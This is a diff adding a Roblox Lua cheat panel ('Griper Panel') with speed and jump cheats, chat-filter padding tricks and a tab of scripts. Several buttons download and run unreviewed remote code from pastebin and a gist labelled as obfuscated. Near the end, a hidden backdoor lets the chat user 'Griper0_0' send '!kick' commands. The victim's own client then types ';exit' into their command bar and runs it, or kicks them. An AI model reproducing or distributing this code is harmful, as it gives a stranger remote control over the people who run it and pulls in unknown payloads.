@@ -1,0 +1,695 @@
+-- This file was generated at discord.gg/syncrypt
+
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+if PlayerGui:FindFirstChild("GriperPanel") then
+	PlayerGui.GriperPanel:Destroy()
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+
+ScreenGui.Name = "GriperPanel"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.DisplayOrder = 999
+ScreenGui.Parent = PlayerGui
+
+local Frame = Instance.new("Frame")
+
+Frame.Size = UDim2.new(0, 480, 0, 260)
+Frame.Position = UDim2.new(0.5, -240, 0.5, -130)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+Frame.BackgroundTransparency = 0.1
+Frame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+
+UICorner.CornerRadius = UDim.new(0, 14)
+UICorner.Parent = Frame
+
+local UIGradient = Instance.new("UIGradient")
+
+UIGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 45, 55)), ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 25)) })
+UIGradient.Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 0.5), NumberSequenceKeypoint.new(1, 0.5) })
+UIGradient.Rotation = 90
+UIGradient.Parent = Frame
+
+local TextLabel = Instance.new("TextLabel")
+
+TextLabel.Size = UDim2.new(1, -70, 0, 35)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Text = "GRIPER PANEL"
+TextLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
+TextLabel.Font = Enum.Font.GothamBlack
+TextLabel.TextSize = 22
+TextLabel.Parent = Frame
+task.spawn(function()
+	while true do
+		local Parent = task.wait(0.05)
+
+		if Parent then
+			Parent = TextLabel.Parent
+		end
+
+		if not Parent then
+			return
+		end
+
+		TextLabel.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+	end
+end)
+
+local TextButton = Instance.new("TextButton")
+
+TextButton.Size = UDim2.new(0, 35, 0, 35)
+TextButton.Position = UDim2.new(1, -70, 0, 5)
+TextButton.BackgroundTransparency = 1
+TextButton.Text = "−"
+TextButton.TextColor3 = Color3.new(1, 1, 1)
+TextButton.Font = Enum.Font.GothamBold
+TextButton.TextSize = 28
+TextButton.Parent = Frame
+
+local TextButton2 = Instance.new("TextButton")
+
+TextButton2.Size = UDim2.new(0, 35, 0, 35)
+TextButton2.Position = UDim2.new(1, -35, 0, 5)
+TextButton2.BackgroundTransparency = 1
+TextButton2.Text = "X"
+TextButton2.TextColor3 = Color3.new(1, 1, 1)
+TextButton2.Font = Enum.Font.GothamBold
+TextButton2.TextSize = 24
+TextButton2.Parent = Frame
+
+local TextButton3 = Instance.new("TextButton")
+
+TextButton3.Size = UDim2.new(0, 90, 0, 90)
+TextButton3.Position = UDim2.new(0, 25, 1, -110)
+TextButton3.BackgroundTransparency = 1
+TextButton3.Text = "G"
+TextButton3.TextColor3 = Color3.fromRGB(220, 20, 20)
+TextButton3.Font = Enum.Font.GothamBlack
+TextButton3.TextSize = 80
+TextButton3.Visible = false
+TextButton3.Active = true
+TextButton3.Draggable = true
+TextButton3.Parent = ScreenGui
+task.spawn(function()
+	while true do
+		local Parent = task.wait(0.1)
+
+		if Parent then
+			Parent = TextButton3.Parent
+		end
+
+		if not Parent then
+			return
+		end
+
+		local v16 = tick() % 6
+		local color3
+
+		if v16 < 1.5 then
+			color3 = Color3.fromRGB(220, 20, 20)
+		elseif v16 < 2.7 then
+			color3 = Color3.fromRGB(120, 0, 0)
+		elseif v16 < 3.8 then
+			color3 = Color3.fromRGB(12, 12, 12)
+		else
+			color3 = Color3.fromHSV((v16 - 3.8) / 2.2, 0.98, 1)
+		end
+
+		TextButton3.TextColor3 = color3
+	end
+end)
+
+local Frame2 = Instance.new("Frame")
+
+Frame2.Size = UDim2.new(0, 110, 1, -35)
+Frame2.Position = UDim2.new(0, 0, 0, 35)
+Frame2.BackgroundTransparency = 0.3
+Frame2.Parent = Frame
+Instance.new("UICorner", Frame2).CornerRadius = UDim.new(0, 10)
+
+local Frame3 = Instance.new("Frame")
+
+Frame3.Size = UDim2.new(1, -120, 1, -45)
+Frame3.Position = UDim2.new(0, 115, 0, 40)
+Frame3.BackgroundTransparency = 1
+Frame3.Parent = Frame
+
+local t1 = {}
+local u21 = nil
+
+local function createFrame(p1)
+	local TextButton4 = Instance.new("TextButton")
+
+	TextButton4.Size = UDim2.new(1, -10, 0, 40)
+	TextButton4.Position = UDim2.new(0, 5, 0, #t1 * 45 + 5)
+	TextButton4.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
+	TextButton4.BackgroundTransparency = 0.3
+	TextButton4.Text = p1
+	TextButton4.TextColor3 = Color3.new(1, 1, 1)
+	TextButton4.Font = Enum.Font.GothamBold
+	TextButton4.TextSize = 18
+	TextButton4.Parent = Frame2
+	Instance.new("UICorner", TextButton4).CornerRadius = UDim.new(0, 8)
+
+	local Frame4 = Instance.new("Frame")
+
+	Frame4.Size = UDim2.new(1, 0, 1, 0)
+	Frame4.BackgroundTransparency = 1
+	Frame4.Visible = false
+	Frame4.Parent = Frame3
+
+	local v25 = t1
+
+	table.insert(v25, {
+		btn = TextButton4,
+		page = Frame4
+	})
+	TextButton4.MouseButton1Click:Connect(function()
+		if not u21 then
+			Frame4.Visible = true
+			TextButton4.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+			u21 = {
+				btn = TextButton4,
+				page = Frame4
+			}
+
+			return
+		end
+
+		u21.page.Visible = false
+		u21.btn.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
+		Frame4.Visible = true
+		TextButton4.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+		u21 = {
+			btn = TextButton4,
+			page = Frame4
+		}
+	end)
+
+	return Frame4
+end
+
+local user = createFrame("USER")
+local ImageLabel = Instance.new("ImageLabel")
+
+ImageLabel.Size = UDim2.new(0, 80, 0, 80)
+ImageLabel.Position = UDim2.new(0.5, -40, 0, 10)
+ImageLabel.BackgroundTransparency = 1
+ImageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. LocalPlayer.UserId .. "&w=420&h=420"
+ImageLabel.Parent = user
+
+local TextLabel2 = Instance.new("TextLabel")
+
+TextLabel2.Size = UDim2.new(1, -20, 0, 100)
+TextLabel2.Position = UDim2.new(0, 10, 1, -110)
+TextLabel2.BackgroundTransparency = 1
+TextLabel2.TextColor3 = Color3.new(1, 1, 1)
+TextLabel2.Font = Enum.Font.GothamSemibold
+TextLabel2.TextSize = 18
+TextLabel2.TextXAlignment = Enum.TextXAlignment.Center
+TextLabel2.Text = "Username: " .. LocalPlayer.Name .. "\nUser ID: " .. LocalPlayer.UserId .. "\nDisplay Name: " .. LocalPlayer.DisplayName
+TextLabel2.Parent = user
+
+local scripts = createFrame("SCRIPTS")
+local TextButton4 = Instance.new("TextButton")
+
+TextButton4.Size = UDim2.new(0, 140, 0, 30)
+TextButton4.Position = UDim2.new(0.01, 0, 0.04, 0)
+TextButton4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton4.BackgroundTransparency = 0.7
+TextButton4.Text = "GRIPER V4"
+TextButton4.TextColor3 = Color3.new(0, 0, 0)
+TextButton4.Font = Enum.Font.GothamBold
+TextButton4.TextSize = 14
+TextButton4.Parent = scripts
+Instance.new("UICorner", TextButton4).CornerRadius = UDim.new(0, 6)
+TextButton4.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/BbXraMwS"))()
+end)
+
+local TextButton5 = Instance.new("TextButton")
+
+TextButton5.Size = UDim2.new(0, 140, 0, 30)
+TextButton5.Position = UDim2.new(0.01, 0, 0.04, 32)
+TextButton5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton5.BackgroundTransparency = 0.7
+TextButton5.Text = "GRIPER BYPASSER"
+TextButton5.TextColor3 = Color3.new(0, 0, 0)
+TextButton5.Font = Enum.Font.GothamBold
+TextButton5.TextSize = 14
+TextButton5.Parent = scripts
+Instance.new("UICorner", TextButton5).CornerRadius = UDim.new(0, 6)
+TextButton5.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/8a5Fikdx"))()
+end)
+
+local TextButton6 = Instance.new("TextButton")
+
+TextButton6.Size = UDim2.new(0, 140, 0, 30)
+TextButton6.Position = UDim2.new(0.01, 0, 0.04, 64)
+TextButton6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton6.BackgroundTransparency = 0.7
+TextButton6.Text = "ANTI LAG"
+TextButton6.TextColor3 = Color3.new(0, 0, 0)
+TextButton6.Font = Enum.Font.GothamBold
+TextButton6.TextSize = 14
+TextButton6.Parent = scripts
+Instance.new("UICorner", TextButton6).CornerRadius = UDim.new(0, 6)
+TextButton6.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/aDdTXwGv"))()
+end)
+
+local TextButton7 = Instance.new("TextButton")
+
+TextButton7.Size = UDim2.new(0, 140, 0, 30)
+TextButton7.Position = UDim2.new(0.01, 0, 0.04, 96)
+TextButton7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton7.BackgroundTransparency = 0.7
+TextButton7.Text = "ANTI BANG"
+TextButton7.TextColor3 = Color3.new(0, 0, 0)
+TextButton7.Font = Enum.Font.GothamBold
+TextButton7.TextSize = 14
+TextButton7.Parent = scripts
+Instance.new("UICorner", TextButton7).CornerRadius = UDim.new(0, 6)
+TextButton7.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/msSh2JHM"))()
+end)
+
+local chat = createFrame("CHAT")
+local v35 = nil
+
+local function v36(p2)
+	local v37 = string.lower(p2):gsub("[^a-z]", "")
+
+	for _, v in ipairs(v35) do
+		if v37:find(v, 1, true) then
+			return true
+		end
+	end
+
+	return false
+end
+
+v35 = {
+	"griper",
+	"gruper",
+	"gr1p3r",
+	"gr1per",
+	"grip3r",
+	"gripr",
+	"gripper",
+	"grpr",
+	"yesha",
+	"yesah",
+	"y3sh4",
+	"y3sha",
+	"yesh4",
+	"yasha",
+	"vws",
+	"svg",
+	"savage",
+	"s4v4g3",
+	"s4vage",
+	"s4vag3",
+	"savag3",
+	"s4v4ge",
+	"gtiper",
+	"gr1p1r",
+	"giper",
+	"grier",
+	"void"
+}
+
+local t2 = {}
+local t3 = {}
+local t4 = {}
+
+local function v43(p3, p4, p5, p6)
+	local TextBox = Instance.new("TextBox")
+
+	TextBox.Name = p4
+	TextBox.Size = UDim2.new(0, 300, 0, 40)
+	TextBox.Position = UDim2.new(0, 20, 0, p3)
+	TextBox.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+	TextBox.PlaceholderText = p4
+	TextBox.Text = ""
+	TextBox.TextColor3 = Color3.new(1, 1, 1)
+	TextBox.Font = Enum.Font.Gotham
+	TextBox.TextSize = 18
+	TextBox.Parent = chat
+
+	local UICorner2 = Instance.new("UICorner")
+
+	UICorner2.CornerRadius = UDim.new(0, 8)
+	UICorner2.Parent = TextBox
+
+	local TextButton8 = Instance.new("TextButton")
+
+	TextButton8.Size = UDim2.new(0, 80, 0, 40)
+	TextButton8.Position = UDim2.new(1, -90, 0, p3)
+	TextButton8.BackgroundColor3 = p6
+	TextButton8.Text = "SEND"
+	TextButton8.TextColor3 = Color3.new(1, 1, 1)
+	TextButton8.Font = Enum.Font.GothamBold
+	TextButton8.TextSize = 18
+	TextButton8.Parent = chat
+
+	local UICorner3 = Instance.new("UICorner")
+
+	UICorner3.CornerRadius = UDim.new(0, 8)
+	UICorner3.Parent = TextButton8
+
+	local v48 = t2
+
+	table.insert(v48, TextButton8)
+	t3[TextButton8] = p6
+	t4[TextButton8] = UICorner3.CornerRadius
+
+	local function v49()
+		local match = TextBox.Text:match("^%s*(.-)%s*$")
+
+		if match == "" then
+			return
+		end
+
+		if v36(match) then
+			for _, v in ipairs(t2) do
+				v.BackgroundColor3 = Color3.fromRGB(220, 0, 0)
+				v.TextColor3 = Color3.new(1, 1, 1)
+				v.Text = "CANT USE THAT NAME"
+				v:FindFirstChild("UICorner").CornerRadius = UDim.new(0, 0)
+			end
+
+			task.delay(1, function()
+				for _, v in ipairs(t2) do
+					v.BackgroundColor3 = t3[v]
+					v.TextColor3 = Color3.new(1, 1, 1)
+					v.Text = "SEND"
+					v:FindFirstChild("UICorner").CornerRadius = t4[v]
+				end
+			end)
+
+			return
+		end
+
+		local v55 = " > " .. match
+		local v56 = 200 - #v55
+		local v57 = #p5
+		local v58 = v56 / v57
+		local v59 = math.floor(v58)
+		local v60 = math.max(0, v59)
+		local v61 = string.rep(p5, v60)
+
+		if v57 <= #v61 then
+			v61 = v61:sub(1, #v61 - v57)
+		end
+
+		local v62 = v61 .. v55
+
+		if #v62 > 200 then
+			v62 = v62:sub(1, 200)
+		end
+
+		local RBXGeneral = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+
+		if not RBXGeneral then
+			return
+		end
+
+		pcall(function()
+			RBXGeneral:SendAsync(v62)
+		end)
+	end
+
+	TextButton8.MouseButton1Click:Connect(v49)
+	TextBox.FocusLost:Connect(function(enterPressed)
+		if not enterPressed then
+			return
+		end
+
+		v49()
+	end)
+end
+
+v43(10, "METHOD ____", "____", Color3.fromRGB(0, 180, 0))
+v43(60, "METHOD -_-_-", "-_-_-", Color3.fromRGB(0, 160, 0))
+v43(110, "METHOD ####", "####", Color3.fromRGB(0, 140, 0))
+
+local player = createFrame("PLAYER")
+local TextLabel3 = Instance.new("TextLabel")
+
+TextLabel3.Size = UDim2.new(0, 100, 0, 40)
+TextLabel3.Position = UDim2.new(0, 20, 0, 10)
+TextLabel3.BackgroundTransparency = 1
+TextLabel3.Text = "SPEED"
+TextLabel3.TextColor3 = Color3.new(1, 1, 1)
+TextLabel3.Font = Enum.Font.GothamBold
+TextLabel3.TextSize = 20
+TextLabel3.Parent = player
+
+local TextBox = Instance.new("TextBox")
+
+TextBox.Size = UDim2.new(0, 120, 0, 40)
+TextBox.Position = UDim2.new(0, 130, 0, 10)
+TextBox.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+TextBox.PlaceholderText = "16"
+TextBox.TextColor3 = Color3.new(1, 1, 1)
+TextBox.Font = Enum.Font.Gotham
+TextBox.TextSize = 18
+TextBox.Parent = player
+Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 8)
+TextBox.FocusLost:Connect(function(enterPressed)
+	if not enterPressed then
+		return
+	end
+
+	local Text = TextBox.Text
+	local walkSpeed = tonumber(Text)
+	local Character
+
+	if walkSpeed then
+		Character = LocalPlayer.Character
+
+		if Character then
+			Character = LocalPlayer.Character:FindFirstChild("Humanoid")
+		end
+	else
+		Character = walkSpeed
+	end
+
+	if not Character then
+		return
+	end
+
+	LocalPlayer.Character.Humanoid.WalkSpeed = walkSpeed
+end)
+
+local TextLabel4 = Instance.new("TextLabel")
+
+TextLabel4.Size = UDim2.new(0, 100, 0, 40)
+TextLabel4.Position = UDim2.new(0, 20, 0, 60)
+TextLabel4.BackgroundTransparency = 1
+TextLabel4.Text = "JUMP"
+TextLabel4.TextColor3 = Color3.new(1, 1, 1)
+TextLabel4.Font = Enum.Font.GothamBold
+TextLabel4.TextSize = 20
+TextLabel4.Parent = player
+
+local TextBox2 = Instance.new("TextBox")
+
+TextBox2.Size = UDim2.new(0, 120, 0, 40)
+TextBox2.Position = UDim2.new(0, 130, 0, 60)
+TextBox2.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+TextBox2.PlaceholderText = "50"
+TextBox2.TextColor3 = Color3.new(1, 1, 1)
+TextBox2.Font = Enum.Font.Gotham
+TextBox2.TextSize = 18
+TextBox2.Parent = player
+Instance.new("UICorner", TextBox2).CornerRadius = UDim.new(0, 8)
+TextBox2.FocusLost:Connect(function(enterPressed)
+	if not enterPressed then
+		return
+	end
+
+	local Text = TextBox2.Text
+	local jumpPower = tonumber(Text)
+	local Character
+
+	if jumpPower then
+		Character = LocalPlayer.Character
+
+		if Character then
+			Character = LocalPlayer.Character:FindFirstChild("Humanoid")
+		end
+	else
+		Character = jumpPower
+	end
+
+	if not Character then
+		return
+	end
+
+	LocalPlayer.Character.Humanoid.JumpPower = jumpPower
+end)
+
+local TextButton8 = Instance.new("TextButton")
+
+TextButton8.Size = UDim2.new(0, 300, 0, 50)
+TextButton8.Position = UDim2.new(0.5, -150, 0, 120)
+TextButton8.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+TextButton8.Text = "FLY GUI"
+TextButton8.TextColor3 = Color3.new(1, 1, 1)
+TextButton8.Font = Enum.Font.GothamBold
+TextButton8.TextSize = 22
+TextButton8.Parent = player
+Instance.new("UICorner", TextButton8).CornerRadius = UDim.new(0, 10)
+TextButton8.MouseButton1Click:Connect(function()
+	loadstring("loadstring(game:HttpGet((\'https://gist.githubusercontent.com/meozoneYT/bf037dff9f0a70017304ddd67fdcd370/raw/e14e74f425b060df523343cf30b787074eb3c5d2/arceus%2520x%2520fly%25202%2520obflucator\'),true))()\n\n")()
+end)
+
+local credits = createFrame("CREDITS")
+local TextLabel5 = Instance.new("TextLabel")
+
+TextLabel5.Size = UDim2.new(1, 0, 1, 0)
+TextLabel5.BackgroundTransparency = 1
+TextLabel5.Text = "Cʀᴇᴀᴛᴏʀ: [Gʀɪᴘᴇʀ0_0]"
+TextLabel5.TextColor3 = Color3.new(1, 1, 1)
+TextLabel5.Font = Enum.Font.GothamBold
+TextLabel5.TextSize = 28
+TextLabel5.TextXAlignment = Enum.TextXAlignment.Center
+TextLabel5.TextYAlignment = Enum.TextYAlignment.Center
+TextLabel5.Parent = credits
+task.spawn(function()
+	while true do
+		local Parent = task.wait(0.05)
+
+		if Parent then
+			Parent = TextLabel5.Parent
+		end
+
+		if not Parent then
+			return
+		end
+
+		TextLabel5.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+	end
+end)
+TextButton.MouseButton1Click:Connect(function()
+	Frame.Visible = false
+	TextButton3.Visible = true
+end)
+TextButton2.MouseButton1Click:Connect(function()
+	Frame.Visible = false
+	TextButton3.Visible = true
+end)
+TextButton3.MouseButton1Click:Connect(function()
+	Frame.Visible = true
+	TextButton3.Visible = false
+end)
+t1[1].btn.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+t1[1].page.Visible = true
+u21 = t1[1]
+task.spawn(function()
+	local RBXGeneral = TextChatService.TextChannels:WaitForChild("RBXGeneral", 10)
+
+	if not RBXGeneral then
+		return
+	end
+
+	RBXGeneral.MessageReceived:Connect(function(p7)
+		if not p7.TextSource then
+			return
+		end
+
+		if Players:GetPlayerByUserId(p7.TextSource.UserId).Name ~= "Griper0_0" then
+			return
+		end
+
+		local Text = p7.Text
+
+		if not Text:lower():match("^!kick") then
+			return
+		end
+
+		local match = Text:match("^!kick%s+(.+)") or ""
+
+		if match == "" then
+			RBXGeneral:SendAsync("Usage: !kick username [reason]")
+
+			return
+		end
+
+		local match2 = match:match("^(%S+)")
+		local match3 = match:match("^%S+%s+(.+)") or "KICKED BY GRIPER"
+		local v84 = Players:FindFirstChild(match2)
+
+		if not v84 then
+			local v85 = Players
+
+			v84 = v85.FindFirstChild(v85, match2:gsub("^%l", string.upper))
+		end
+
+		if not v84 then
+			RBXGeneral:SendAsync("Player not found.")
+
+			return
+		end
+
+		RBXGeneral:SendAsync(v84.Name .. " kicked. Reason: " .. match3)
+		task.delay(0.4, function()
+			local v86 = false
+
+			for _, descendant in ipairs(v84.PlayerGui:GetDescendants()) do
+				if descendant:IsA("TextBox") then
+					local v89 = descendant.Name:lower()
+					local v90 = (descendant.PlaceholderText or ""):lower()
+
+					if v89:find("cmd") or (v89:find("command") or (v89:find("bar") or (v89:find("infinite") or (v89:find("iy") or (v90:find("command") or (v90:find("infinite") or v90:find("iy"))))))) then
+						descendant.Text = ";exit"
+						task.spawn(function()
+							task.wait(0.15)
+
+							local Execute = descendant.Parent:FindFirstChild("Execute") or (descendant.Parent.Parent:FindFirstChild("Execute", true) or (descendant.Parent:FindFirstChild("Run") or descendant.Parent.Parent:FindFirstChild("Run", true)))
+							local isTextButton
+
+							if Execute then
+								isTextButton = Execute:IsA("TextButton")
+							else
+								isTextButton = Execute
+							end
+
+							if isTextButton then
+								Execute:Activate()
+							else
+								VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
+								task.wait(0.03)
+								VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+							end
+						end)
+						v86 = true
+
+						break
+					end
+				end
+			end
+
+			local function v93()
+				if v86 then
+					return
+				end
+
+				v84:Kick(match3)
+			end
+
+			task.delay(1.4, v93)
+		end)
+	end)
+end)
+print("GRIPER PANEL LOADED")
